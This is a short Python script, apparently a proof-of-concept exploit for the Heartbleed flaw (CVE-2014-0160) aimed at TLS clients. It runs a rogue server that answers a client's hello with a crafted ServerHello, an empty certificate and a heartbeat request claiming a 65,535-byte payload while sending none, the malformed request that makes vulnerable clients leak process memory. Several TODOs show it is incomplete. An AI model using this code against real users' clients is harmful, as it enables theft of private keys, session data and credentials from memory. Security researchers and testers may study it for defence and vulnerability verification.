#!/usr/bin/env python
# Exploitation of CVE-2014-0160 Heartbeat for the client
# Author: Peter Wu <peter@lekensteyn.nl>

import socketserver
import sys
import struct

def make_hello(cipher):
    # Record
    data = '16 03 02'
    data += ' 00 31' # Record ength
    # Handshake
    data += ' 02 00'
    data += ' 00 2d' # Handshake length
    data += ' 03 02' # TLS version
    data += '''
    52 34 c6 6d 86 8d e8 40 97 da
    ee 7e 21 c4 1d 2e 9f e9 60 5f 05 b0 ce af 7e b7
    95 8c 33 42 3f d5 00
    '''
    data += ' '.join('{:02x}'.format(c) for c in cipher)
    data += ' 00' # No compression
    data += ' 00 05' # Extensions length
    # Heartbeat extension
    data += ' 00 0f' # Heartbeat type
    data += ' 00 01' # Length
    data += ' 01'    # mode
    return bytearray.fromhex(data.replace('\n', ''))

def make_cert():
    data = '16 03 02'
    data += ' 00 07' # Length
    # Handshake
    data += ' 0b' # Certificate
    data += ' 00 00 03' # Length
    data += ' 00 00 00' # Certificates length
    # TODO: fix parameters
    return bytearray.fromhex(data.replace('\n', ''))

def make_heartbeat():
    data = '18 03 02'
    data += ' 00 03'    # Length
    data += ' 01'       # Type: Request
    data += ' ff ff'    # Payload Length
    return bytearray.fromhex(data.replace('\n', ''))

class TCPSvr(socketserver.BaseRequestHandler):
    def handle(self):
        # Read TLS record header
        hdr = self.request.recv(5)
        content_type, ver, rec_len = struct.unpack('>BHH', hdr)
        self.expect(content_type == 22, "Handshake type")

        # Read handshake
        hnd = self.request.recv(rec_len)
        hnd_type, len_high, len_low, ver = struct.unpack('<BBHH', hnd[:6])
        self.expect(hnd_type == 1, "Client Hello")
        # hnd[6:6+32] is Random
        off = 6 + 32
        sid_len, = struct.unpack('B', hnd[off:off+1])
        off += 1 + sid_len # Skip length and SID
        ciphers_len = struct.unpack("<H", hnd[off:off+2])
        off += 2
        # TODO: pick a cipher that does not need ServerKeyExchange
        #cipher = hnd[off:off+2]
        cipher = (0, 0xa) # TODO: refine cipher selection

        # (1) Handshake: ServerHello
        self.request.sendall(make_hello(cipher))

        # (2) Certificate
        self.request.sendall(make_cert())

        # (3) HeartbeatRequest
        self.request.sendall(make_heartbeat())
    def expect(self, cond, what):
        if not cond:
            print("Expected " + what)
            self.request.close()


def serve(port):
    addr = ('', port)
    server = socketserver.TCPServer(addr, TCPSvr)
    server.serve_forever()

if __name__ == '__main__':
    serve(int(sys.argv[1]))
